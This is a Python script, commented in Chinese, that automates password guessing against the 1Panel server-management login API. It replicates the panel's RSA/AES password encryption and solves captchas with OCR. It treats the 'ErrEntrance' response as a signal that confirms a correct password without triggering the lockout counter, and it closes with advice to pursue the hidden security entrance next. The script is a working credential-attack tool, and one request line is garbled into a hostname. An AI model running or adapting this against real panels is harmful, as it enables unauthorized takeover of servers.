# 核心实现（Python）
import base64, os, secrets, urllib.parse, json, time
import requests, ddddocr
from cryptography.hazmat.primitives import padding as sympadding, serialization
from cryptography.hazmat.primitives.asymmetric import padding as asympadding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

BASE = "http://TARGET:9527"
ocr = ddddocr.DdddOcr(show_ad=False)
S = requests.Session(); S.trust_env = False

# 1) 公钥
S.get(BASE + "/api/v2/core/auth/setting", timeout=20)
ck = S.cookies.get("panel_public_key")
b64 = urllib.parse.unquote(ck).replace('"', ''); b64 += "=" * (-len(b64) % 4)
pub = serialization.load_pem_public_key(base64.b64decode(b64).decode().encode())

def enc_pw(pw: str) -> str:
    k = secrets.token_hex(16)                      # 32 hex chars -> AES-256 key (UTF-8 bytes)
    rsa = base64.b64encode(pub.encrypt(k.encode(), asympadding.PKCS1v15())).decode()
    iv = os.urandom(16)
    p = sympadding.PKCS7(128).padder()
    data = p.update(pw.encode()) + p.finalize()
    c = Cipher(algorithms.AES(k.encode()), modes.CBC(iv)).encryptor()
    ct = c.update(data) + c.finalize()
    return "%s:%s:%s" % (rsa, base64.b64encode(iv).decode(), base64.b64encode(ct).decode())

def attempt(name, pw):
    g = S.get(BASE + "/api/v2/core/auth/captcha", timeout=20).json()["data"]
    png = base64.b64decode(g["imagePath"].split(",", 1)[1])
    cap = ocr.classification(png)                  # 大小写不敏感
    body = {"name": name, "password": enc_pw(pw), "captcha": cap,
            "captchaID": g["captchaID"], "language": "zh"}
    r = target8.example.com(BASE + "/api/v2/core/auth/login", json=body, timeout=25)
    return r.json()                                # message: ErrAuth / ErrEntrance / ErrCaptchaCode

# 判读
# ErrAuth       -> 口令错（会累计 IPTracker.RecordFailure）
# ErrEntrance   -> 口令对、只缺安全入口（不累计失败）← 唯一命中信号
# ErrCaptchaCode-> OCR 失误，重取验证码重试

# 关键源码依据（1Panel-dev/1Panel dev-v2）
# core/app/api/v2/auth.go:
#   if msgKey == "ErrAuth" || msgKey == "ErrEntrance" || msgKey == "ErrNoneNode" {
#       if msgKey == "ErrAuth" { global.IPTracker.RecordFailure(ip); global.IPTracker.SetNeedCaptcha(ip) }
#       helper.BadAuth(c, msgKey, err); return }
# frontend/src/utils/auth.ts: encryptPassword() 三段式；无 panel_public_key 时前端回退明文
# core/app/dto/auth.go: Login{Name,Password,Captcha,CaptchaID,Language,AuthSource} —— 无 ignoreCaptcha 字段
#
# 结论（省时间，勿重复投入）：安全入口启用时，口令校验在入口校验之前/之后的分支只给出
# ErrEntrance 而不下发会话 ⇒ 对启用安全入口的 1Panel 做在线口令审计，命中也不产生权限，
# 应放弃爆破，转而寻找安全入口本身（1pctl user-info 需 SSH；面板配置文件在 /opt/1panel/）。
